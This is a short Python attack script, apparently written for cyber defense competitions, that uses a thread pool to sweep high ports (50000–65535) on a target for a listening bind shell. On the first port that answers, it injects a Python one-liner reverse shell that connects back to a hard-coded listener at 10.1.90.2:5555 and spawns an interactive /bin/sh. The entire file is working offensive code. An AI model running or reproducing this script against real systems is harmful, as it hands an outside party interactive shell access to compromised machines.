'''
Many times in CDCs there are random bind shells on high ports.
This script will attempt to brute force which port the bind shell
is on and run a command if successful.
'''

import socket
import sys
from multiprocessing import Pool


def hunt_bind_shells(r_port):
    l_host = '10.1.90.2'
    l_port = '5555'
    # create a new socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    python3_reverse = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + l_host + "\"," + l_port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
    try:
        s.connect((host, r_port))
        print(green + "Winner {0} {1}".format(host, r_port) + end_color)
        print(blue + "Go get your Shellz!" + end_color)
        s.send(python3_reverse.encode())

        data = s.recv(1024)

        print(data)
        s.close()
        exit()

    except socket.error as e:
        print(red + "{0} {1} ".format(host, r_port) + str(e) + end_color)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: python3 ' + sys.argv[0] + ' host threads')
        sys.exit(0)

    # Declare some colors to use
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    blue = '\033[94m'
    end_color = '\033[0m'

    # Assign arguments to more meaningful variables
    host = sys.argv[1]
    threads = int(sys.argv[2])

    with Pool(threads) as p:
        p.map(hunt_bind_shells, range(50000, 65535))



